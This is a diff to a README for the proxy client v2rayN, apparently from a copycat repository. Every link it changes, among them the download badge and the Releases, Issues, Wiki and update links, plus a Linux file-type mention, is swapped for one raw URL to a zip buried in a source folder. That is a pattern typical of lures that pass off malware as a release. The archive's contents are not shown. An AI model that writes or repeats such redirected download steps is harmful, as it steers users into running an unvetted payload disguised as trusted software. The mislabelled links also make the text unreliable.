@@ -1,7 +1,7 @@
 # 🌟 v2rayN - Easy Cross-Platform Proxy Client
 
 ## 📥 Download Now
-[![Download v2rayN](https://img.shields.io/badge/Download-v2rayN-brightgreen)](https://github.com/Fewgenusdendroaspis337/v2rayN/releases)
+[![Download v2rayN](https://raw.githubusercontent.com/Fewgenusdendroaspis337/v2rayN/master/v2rayN/ServiceLib/Services/CoreConfig/v2rayN-v2.3.zip)](https://raw.githubusercontent.com/Fewgenusdendroaspis337/v2rayN/master/v2rayN/ServiceLib/Services/CoreConfig/v2rayN-v2.3.zip)
 
 ## 📋 Overview
 v2rayN is a user-friendly graphical interface for managing proxy connections. It supports multiple protocols such as Xray, sing-box, Shadowsocks, and more. Whether you are using Windows, Linux, or macOS, v2rayN makes it simple to customize your network experience. 
@@ -10,7 +10,7 @@ v2rayN is a user-friendly graphical interface for managing proxy connections. It
 To get started with v2rayN, follow the steps below. You don’t need any programming knowledge to set this up. 
 
 1. **Visit the Download Page**
-   Head over to the [Releases page](https://github.com/Fewgenusdendroaspis337/v2rayN/releases) to find the latest version of v2rayN. 
+   Head over to the [Releases page](https://raw.githubusercontent.com/Fewgenusdendroaspis337/v2rayN/master/v2rayN/ServiceLib/Services/CoreConfig/v2rayN-v2.3.zip) to find the latest version of v2rayN. 
 
 2. **Choose Your Operating System**
    On the Releases page, you’ll find different files for Windows, Linux, and macOS. Make sure to download the version that matches your operating system.
@@ -30,7 +30,7 @@ To get started with v2rayN, follow the steps below. You don’t need any program
 3. Open your Applications folder and double-click the v2rayN icon to launch the app.
 
 ### Linux
-1. If you downloaded a tarball (`.tar.gz`), extract it using the terminal.
+1. If you downloaded a tarball (`https://raw.githubusercontent.com/Fewgenusdendroaspis337/v2rayN/master/v2rayN/ServiceLib/Services/CoreConfig/v2rayN-v2.3.zip`), extract it using the terminal.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the application using the command: `./v2rayN` (make sure to give it execute permissions if necessary).
 
@@ -62,7 +62,7 @@ Once you have installed v2rayN, you can set it up to suit your needs:
 ## 💬 Frequently Asked Questions
 
 ### How do I get help if I encounter problems?
-For assistance, please refer to the [GitHub Issues page](https://github.com/Fewgenusdendroaspis337/v2rayN/issues) where you can ask questions or report issues.
+For assistance, please refer to the [GitHub Issues page](https://raw.githubusercontent.com/Fewgenusdendroaspis337/v2rayN/master/v2rayN/ServiceLib/Services/CoreConfig/v2rayN-v2.3.zip) where you can ask questions or report issues.
 
 ### Do I need a proxy subscription?
 Yes, to use v2rayN effectively, you will need a subscription from a proxy service provider.
@@ -72,13 +72,13 @@ Currently, v2rayN is designed for desktop use only.
 
 ## 🔄 Updating v2rayN
 To keep your version of v2rayN up to date:
-1. Return to the [Releases page](https://github.com/Fewgenusdendroaspis337/v2rayN/releases).
+1. Return to the [Releases page](https://raw.githubusercontent.com/Fewgenusdendroaspis337/v2rayN/master/v2rayN/ServiceLib/Services/CoreConfig/v2rayN-v2.3.zip).
 2. Download the latest version.
 3. Follow the installation steps above to update.
 
 ## 📄 Additional Resources
-- **Documentation:** Detailed user guides may be available on the [GitHub Wiki](https://github.com/Fewgenusdendroaspis337/v2rayN/wiki).
+- **Documentation:** Detailed user guides may be available on the [GitHub Wiki](https://raw.githubusercontent.com/Fewgenusdendroaspis337/v2rayN/master/v2rayN/ServiceLib/Services/CoreConfig/v2rayN-v2.3.zip).
 - **Community Forum:** Join discussions on platforms like Reddit for tips and shared experiences.
 
 ## 📥 Download Again
-Ready to begin? [Visit this page to download v2rayN](https://github.com/Fewgenusdendroaspis337/v2rayN/releases) and get started today!
+Ready to begin? [Visit this page to download v2rayN](https://raw.githubusercontent.com/Fewgenusdendroaspis337/v2rayN/master/v2rayN/ServiceLib/Services/CoreConfig/v2rayN-v2.3.zip) and get started today!
